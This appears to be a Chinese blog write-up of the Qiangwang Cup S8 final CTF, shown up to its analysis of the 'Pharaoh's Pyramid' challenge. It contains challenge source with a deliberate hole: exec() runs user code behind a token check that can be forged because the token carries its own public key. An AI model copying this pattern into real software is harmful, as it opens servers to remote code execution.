
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>强网杯S8 Final | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jeopardy"><span class="toc-number">2.</span> <span class="toc-text">Jeopardy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pharaoh%E2%80%99s-Pyramid"><span class="toc-number">2.1.</span> <span class="toc-text">Pharaoh’s Pyramid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9Apyramid%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text">法二：pyramid内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezlogin"><span class="toc-number">2.2.</span> <span class="toc-text">ezlogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anniversary%EF%BC%880-Solved%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">anniversary（0 Solved）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RW"><span class="toc-number">3.</span> <span class="toc-text">RW</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TS-%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">TS++（Unsolved）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%B8%E8%AE%B0%EF%BC%88to-be-continued%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">游记（to be continued）</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>强网杯S8 Final</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/12/5
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                线下赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">2.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">14分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我大概一辈子都忘不了强网杯了吧</p>
<span id="more"></span>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16044">强网杯S8决赛RW赛道-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/3974">奇安信攻防社区-强网杯S8决赛Pyramid框架下内存马的分析构造及RS加密签名伪造</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16019">S8强网杯 ez_login详解-先知社区</a></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206181319593.png" alt="image-20241206181319593"></p>
<p>没有爆零，不是垫底，作为一个历史短暂的双非校队已经远超预期了（笑）</p>
<hr>
<h1 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h1><h2 id="Pharaoh’s-Pyramid"><a href="#Pharaoh’s-Pyramid" class="headerlink" title="Pharaoh’s Pyramid"></a>Pharaoh’s Pyramid</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wsgiref<span class="token punctuation">.</span>simple_server <span class="token keyword">import</span> make_server
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>config <span class="token keyword">import</span> Configurator
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>events <span class="token keyword">import</span> NewResponse
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response
<span class="token keyword">import</span> util

users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>
default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>


<span class="token keyword">def</span> <span class="token function">register_api</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Not Allowed!"</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input username &amp; password'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"500 Internal Server"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>
    users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Here is your token: "</span><span class="token operator">+</span> token<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">register_front</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">front_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">system_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
        token <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
        data <span class="token operator">=</span> util<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome super_user!"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input code &amp; token'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Configurator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> config<span class="token punctuation">:</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_front'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_api'</span><span class="token punctuation">,</span> <span class="token string">'/api/register'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'system_test'</span><span class="token punctuation">,</span> <span class="token string">'/api/test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'front_test'</span><span class="token punctuation">,</span> <span class="token string">'/test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>system_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'system_test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>front_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'front_test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_api<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_api'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_front<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_front'</span><span class="token punctuation">)</span>
        app <span class="token operator">=</span> config<span class="token punctuation">.</span>make_wsgi_app<span class="token punctuation">(</span><span class="token punctuation">)</span>

    server <span class="token operator">=</span> make_server<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6543</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码，只需要以 admin 登录就能 rce</p>
<p>观察注册获取jwt的部分：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>
default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>

users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> alg <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'HS'</span><span class="token punctuation">,</span> <span class="token string">'RS'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> <span class="token string">"Algorithm must be HS or RS!"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        private_key<span class="token punctuation">,</span> public_key <span class="token operator">=</span> generate_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>
            signature <span class="token operator">=</span> sign_data<span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            data_bytes <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>  <span class="token comment"># data</span>
            encoded_data2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span>  <span class="token comment"># signature</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>encoded_data2<span class="token punctuation">)</span>
            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>
            encoded_data4 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span>  <span class="token comment"># public_key</span>
            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data4<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> encoded_data
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
            data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
            hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>inputdata<span class="token punctuation">)</span>  <span class="token comment"># data</span>
            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>
            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> encoded_data
        
<span class="token keyword">def</span> <span class="token function">sign_data</span><span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>
    <span class="token comment"># 将JSON数据转换为字符串</span>
    data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    signature <span class="token operator">=</span> pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>hash_obj<span class="token punctuation">)</span>
    <span class="token keyword">return</span> signature<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后是decode</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_decode</span><span class="token punctuation">(</span>encode_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        all_data <span class="token operator">=</span> encode_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
        sig_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>
        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>
        alg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> secret
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>
        <span class="token comment"># 验证签名</span>
        is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span>
        <span class="token keyword">if</span> is_valid<span class="token punctuation">:</span>
            <span class="token keyword">return</span> json_data
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> <span class="token string">"something error"</span>
        
<span class="token keyword">def</span> <span class="token function">verify_signature</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>
        rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
        <span class="token comment"># 将JSON数据转换为字符串</span>
        data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
